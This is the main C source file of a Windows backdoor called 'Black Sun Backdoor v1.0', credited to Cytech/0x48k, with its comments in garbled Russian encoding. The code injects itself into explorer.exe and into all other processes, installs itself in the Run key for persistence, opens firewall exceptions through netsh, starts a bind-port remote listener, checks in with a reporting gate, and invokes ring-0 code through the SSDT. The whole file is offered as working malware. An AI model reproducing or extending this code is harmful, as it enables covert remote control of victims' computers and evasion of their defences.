/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [blacksun.c]
 *      main-������� :)
 *  ---------------------------------------------------------------------
 *    thnx to: 
 *         Cr4sh//0x48k, el-//0x48k, gorl, xhack//0x48k, Bill//TPOC 
 *  ---------------------------------------------------------------------
 */
 
#include	"headers.h"

// ---------------------------------------------------------------------------------------
// ��� ������� ��������� ��������� �� ���� DLL ����������� �������� � � ����� ��������
// + ���������� ������ ��� ������� ������ �������� �� ����� (imagehlp.dll � ���������)
// ---------------------------------------------------------------------------------------

static DWORD WINAPI StealthMain(LPVOID lpParam) 
{
	
	LoadLibrary(KERNEL32_DLL);	// 1
	LoadLibrary(ADVAPI32_DLL);	// 2
	LoadLibrary(IMGHLP_DLL);	// 3
	LoadLibrary(SHELL32_DLL);	// 4
	LoadLibrary(WS2_32_DLL);	// 5
	LoadLibrary(URLMON_DLL); 	// 6
	LoadLibrary(WININET_DLL);	// 7
	LoadLibrary(WINMM_DLL);		// 8
	LoadLibrary(USER32_DLL);	// 9

	Stealth();
	
	return 0;
}
// -----------------------------------------------------------------------------------------
// ���� ��� ����� ��������������� � explorer.exe � ������������ ����� �������� ���� �������
// -----------------------------------------------------------------------------------------

static DWORD WINAPI BackdoorMain(LPVOID lpParam) 
{
	HANDLE 	hBindBackdoorThread, 
			hzDownloaderThread;

	StealthMain(NULL); 
		#ifdef NETSHADD
		NetSHFirewallReg(); 				// �������� � netsh �����
		#endif NETSHADD
		InitWinSock2API();  		// �������������� WinSock2 API 
									// ������� ����� �������
		hBindBackdoorThread = StartThread(Backdoor_Listen, (short)BINDPORT);    

		  while(TRUE)
		  {
				// ��������� ������� � ���������... ���� ���, �� ���� 1 ������ � ��������� �����
				if (CheckInternetConnection() == 0)
				{
					Sleep(1*60*1000); 
					continue;
				} 
				// ���� ����������, �� ������� ����� �������� ���� �� ����, ����� ���� ��������� �����
				// (�� ��������� 15 �����), ����� ���������� � ��� �� ����
				else if (CheckInternetConnection() == 1)
				{
					#ifdef USEGATE
					hzDownloaderThread  = StartThread(ReportToStat, NULL);
					#endif USEGAGE
					Sleep(HTTPFREQ*60*1000);
					
				}
		  }

    return TRUE; 	
}

// ---------------------------------------------------------------------------------------
// ���� ��� ������� � explorer.exe
// ---------------------------------------------------------------------------------------

DWORD WINAPI StartExplorerInjThread(LPVOID lParam) 
{
	StartProcInject(NULL, FIRSTINJPROC, BackdoorMain); 
	return 0;
}

// ---------------------------------------------------------------------------------------
// ���� ��� ������� �� ��� ��������
// ---------------------------------------------------------------------------------------

DWORD WINAPI StartAllProcInjThread(LPVOID lParam)
{
	InjectAllProcesses(StealthMain);
	return FALSE;
}

// ---------------------------------------------------------------------------------------
// ���-����... �� ������� ��-�� ���� :D
// ---------------------------------------------------------------------------------------

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	
	HANDLE 	hExplorerInj, 
			hAllProcInj; 
			
	__try
		{
				PDWORD deadcoded = 0;
				*deadcoded = 0xd34dc0d3d;
		} 
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
	
			// ��������������� SST, ����� �� ������� ������.
			//  �� ��� ���� ������ ����� ����� ������������� Cr4sh :)
				ReadSST((PDWORD)&sst);
				CallR0((DWORD)&R0Func);
				
				//������������� � ������������ (run) � ���������� system32
				
			     AddSelfToRun("addtorun");
				 
				// ��������� ����������� ������ 1 ����� ������ � ������� �������� mutex
				
			    CreateMutex(NULL,FALSE, MUTEXNAME);
				
				// ���� mutex ��� ������, �� ���������� (������ �� ��� �� ������)
				
				if(GetLastError() == ERROR_ALREADY_EXISTS)
				{
					ExitProcess(0);
				}

			// ���������� ��� ������� � FIRSTINJPROC ������ �������� �� ��� ��� �����.
				hExplorerInj = StartThread(StartExplorerInjThread, NULL);
	
			// ������� ��� ��������� ��������.
		         hAllProcInj = StartThread(StartAllProcInjThread, NULL);
		 }
	
			return 0;

} 
// -------------------------------------------------------------//
//  Darkcoded by Cytech/0x48k, (x) 2007, hellknights.void.ru    //
// -------------------------------------------------------------//